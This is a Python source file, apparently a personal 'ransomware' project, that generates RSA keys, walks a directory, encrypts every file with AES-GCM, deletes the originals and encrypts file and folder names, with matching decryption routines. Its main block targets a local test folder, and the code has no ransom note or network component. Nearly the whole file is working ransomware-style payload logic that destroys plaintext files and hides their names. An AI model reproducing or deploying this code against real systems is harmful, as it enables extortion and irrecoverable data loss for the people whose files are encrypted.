import os
import base64
from Cryptodome.Hash import SHA256
from Cryptodome.PublicKey import RSA
from Cryptodome.Random import get_random_bytes
from Cryptodome.Cipher import AES, PKCS1_OAEP
from Cryptodome.Protocol.KDF import PBKDF2


# This function generates the private and public keys
def generate_keys():
    key = RSA.generate(2048)
    public_key = key.public_key().export_key()
    private_key = key.export_key()

    return public_key, private_key


def save_key(key, filename, password=None, is_name_key=False):
    """
    This function save the keys into a file for security. Can be encrypted with a passphrase.
    """
    if is_name_key:
        salt = get_random_bytes(16)
        salted_key = PBKDF2(key, salt, 32, count=1000000, hmac_hash_module=SHA256)

        with open(filename, "wb") as file:
            file.write(salt)
            file.write(salted_key)

    else:
        if password:
            key = RSA.import_key(key).export_key(passphrase=password, pkcs=8,
                                                 protection="scryptAndAES128-CBC")
        with open(filename, "wb") as file:
            file.write(key)


def load_key(filename: str, password=None, is_namekey=False):
    """
    This function reads the key from a file
    """
    encoded_key = open(filename, "rb").read()
    if password:
        key = RSA.import_key(encoded_key, passphrase=password)
    else:
        key = RSA.import_key(encoded_key)

    return key.export_key()


def encrypt_dir(directory: str, public_key: bytes, name_key: bytes):
    """
    This function encrypts an entire directory.
    Parameters:
    directory -> str: The location of where your files are located at.
    public_key -> bytes: The public key generated using RSA.
    name_key -> bytes: The private key used to encrypt the file names.
    YOU MIGHT RISK RUINING YOUR ENTIRE SYSTEM AND CAUSING IRRECOVERABLE FILE LOSS.
    ONLY RUN THIS FUNCTION WHEN YOU ARE ABSOLUTELY SURE.
    """
    # Creates AES key
    aes_key = get_random_bytes(16)

    # Encrypt the AES key with RSA
    rsa_key = RSA.import_key(public_key)
    cipher_rsa = PKCS1_OAEP.new(rsa_key)
    enc_aes_key = cipher_rsa.encrypt(aes_key)

    for root, dirs, files in os.walk(directory, topdown=False):
        # Encrypt files
        for file_name in files:
            file_path = os.path.join(root, file_name)
            encrypt_file(file_path, aes_key, enc_aes_key, name_key)

        # Encrypt directory names
        for dir_name in dirs:
            dir_path = os.path.join(root, dir_name)
            name_change = encrypt_name(dir_name, name_key)
            encrypted_path = os.path.join(root, name_change)
            os.rename(dir_path, encrypted_path)
            print(f"Folder {dir_path} has been encrypted and renamed to {encrypted_path}")

    # Encrypt root names
    root_name = os.path.basename(directory)
    print("root: " + root_name)
    root_change = encrypt_name(root_name, name_key)
    encrypted_root = os.path.join(os.path.dirname(directory), root_change)
    os.rename(directory, encrypted_root)
    print(f"Root {directory} has been encrypted and renamed to {encrypted_root}")
    return encrypted_root


def decrypt_dir(encrypted_dir_path, private_key, name_key):
    decrypted_root_name = decrypt_name(os.path.basename(encrypted_dir_path), name_key)
    decrypted_root_path = os.path.join(os.path.dirname(encrypted_dir_path), decrypted_root_name)
    os.rename(encrypted_dir_path, decrypted_root_path)

    for root, dirs, files in os.walk(decrypted_root_path, topdown=False):
        for enc_file_name in files:
            enc_file_path = os.path.join(root, enc_file_name)
            decrypt_file(enc_file_path, private_key, name_key)

        for enc_dir_name in dirs:
            enc_dir_path = os.path.join(root, enc_dir_name)
            decrypted_dir_name = decrypt_name(enc_dir_name, name_key)
            decrypted_path = os.path.join(root, decrypted_dir_name)
            os.rename(enc_dir_path, decrypted_path)

    print(f"Directory '{decrypted_root_path}' has been decrypted.")
    return decrypted_root_path


def encrypt_file(file_directory: str, aes_key, enc_aes_key, name_key: bytes):
    """
    THIS IS THE ACTUAL ENCRYPTION FUNCTION. DO NOT USE THIS UNLESS YOU ARE ABSOLUTELY SURE THAT YOU KNOW WHAT YOU ARE
    DOING. THIS MAY POTENTIALLY LEAD TO IRRECOVERABLE FILE, DATA LOSS AND POTENTIALLY RUIN YOUR ENTIRE SYSTEM.
    """
    with open(file_directory, "rb") as files:
        data = files.read()

    cipher_aes = AES.new(aes_key, AES.MODE_GCM)
    ciphertext, tag = cipher_aes.encrypt_and_digest(data)

    encrypted_name = encrypt_name(os.path.basename(file_directory), name_key)
    encrypted_path = os.path.join(os.path.dirname(file_directory), encrypted_name)

    with open(encrypted_path, "wb") as f:
        f.write(enc_aes_key)
        f.write(cipher_aes.nonce)
        f.write(tag)
        f.write(ciphertext)

    os.remove(file_directory)
    print(f"File '{file_directory}' has been encrypted and renamed to '{encrypted_path}'")


def decrypt_file(encrypted_file_path: str, private_key: bytes, name_key: bytes):
    """
    Decrypts the encrypted file content, given the private key.
    """
    rsa_key = RSA.import_key(private_key)
    cipher_rsa = PKCS1_OAEP.new(rsa_key)

    with open(encrypted_file_path, "rb") as f:
        enc_aes_key = f.read(rsa_key.size_in_bytes())
        nonce = f.read(16)
        tag = f.read(16)
        ciphertext = f.read()

    aes_key = cipher_rsa.decrypt(enc_aes_key)
    cipher_aes = AES.new(aes_key, AES.MODE_GCM, nonce=nonce)
    data = cipher_aes.decrypt_and_verify(ciphertext, tag)

    decrypted_name = decrypt_name(os.path.basename(encrypted_file_path), name_key)
    decrypted_file_path = os.path.join(os.path.dirname(encrypted_file_path), decrypted_name)

    with open(decrypted_file_path, "wb") as file:
        file.write(data)

    os.remove(encrypted_file_path)
    print({f"File {decrypted_file_path} has been decrypted."})


def encrypt_name(filename: str, key: bytes):
    """
    Encrypts the name of a file with a given name key.
    Parameters:
    key: The private key used to encrypt the name of the directories/files
    """
    cipher = AES.new(key, AES.MODE_GCM)
    data = filename.encode("utf-8")
    ciphertext, tag = cipher.encrypt_and_digest(data)

    return base64.urlsafe_b64encode(cipher.nonce + tag + ciphertext).decode("utf-8")


def decrypt_name(encrypted_filename, key):
    """
    Decrypts the name of a file given the name key.
    :param encrypted_filename: the encrypted name of the file
    :param key: the name_key
    """
    data = base64.urlsafe_b64decode(encrypted_filename.encode("utf-8"))
    nonce, tag, ciphertext = data[:16], data[16:32], data[32:]
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)

    return cipher.decrypt_and_verify(ciphertext, tag).decode("utf-8")


if __name__ == "__main__":
    public_key, private_key = generate_keys()  # key for the encryption/decryption
    name_key = SHA256.new(get_random_bytes(32)).digest()  # key for the name of the files

    choice = int(input("Encrypt(0) or Decrypt(1)?"))
    if choice == 0:
        save_key(private_key, 'private_key.pem')
        save_key(public_key, 'public_key.pem')

        # password = input("Enter a password to secure your private key: ")

        with open("name_key.pem", "wb") as file:
            file.write(name_key)

        encrypted_dir = encrypt_dir("C:\\Users\\samue\\PycharmProjects\\ransomware\\password\\one layer deep1\\one more for safety1", public_key, name_key)

    if choice == 1:
        loaded_private_key = load_key('private_key.pem')
        loaded_name_key = open("name_key.pem", "rb").read()

        decrypt_dir("C:\\Users\\samue\\PycharmProjects\\ransomware\\password\\one layer deep1\\sVQpelY4-T_32deyqfBPmcmK5DUeJ22gT1SBnLE6a68JgTuP8532q9NxpAFCJ7TBkjWumQ==",
                    loaded_private_key, loaded_name_key)
